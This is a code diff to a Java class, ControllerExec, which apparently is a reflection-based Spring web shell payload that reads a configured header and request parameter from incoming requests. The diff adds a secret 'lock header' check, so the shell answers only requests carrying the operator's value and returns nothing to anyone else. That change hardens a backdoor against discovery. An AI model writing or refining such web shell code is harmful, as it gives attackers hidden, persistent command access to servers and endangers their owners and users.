@@ -20,8 +20,8 @@ import java.lang.reflect.Method;
 public class ControllerExec {
     private static String HEADER;
     private static String PARAM;
-    private String lockHeaderKey;
-    private String lockHeaderValue;
+    private static String lockHeaderKey;
+    private static String lockHeaderValue;
 
     public ControllerExec() {
     }
@@ -32,6 +32,12 @@ public class ControllerExec {
             Class clazz = Thread.currentThread().getContextClassLoader().loadClass("org.springframework.web.context.request.ServletRequestAttributes");
             Object request = invokeMethod(clazz, requestAttributes, "getRequest", new Class[]{}, new Object[]{});
             Object response = invokeMethod(clazz, requestAttributes, "getResponse", new Class[]{}, new Object[]{});
+
+            String lv = (String) invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{lockHeaderKey});
+            if (lv == null || !lv.contains(lockHeaderValue)) {
+                return "";
+            }
+
             Object header = invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{HEADER});
             Object parameter = invokeMethod(request, "getParameter", new Class[]{String.class}, new Object[]{PARAM});
 
@@ -79,7 +85,7 @@ public class ControllerExec {
     public static Object invokeMethod(Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
         try {
             return invokeMethod(obj.getClass(), obj, methodName, argsClass, args);
-        }catch (Exception e){
+        } catch (Exception e) {
             return invokeMethod(obj.getClass().getSuperclass(), obj, methodName, argsClass, args);
         }
     }
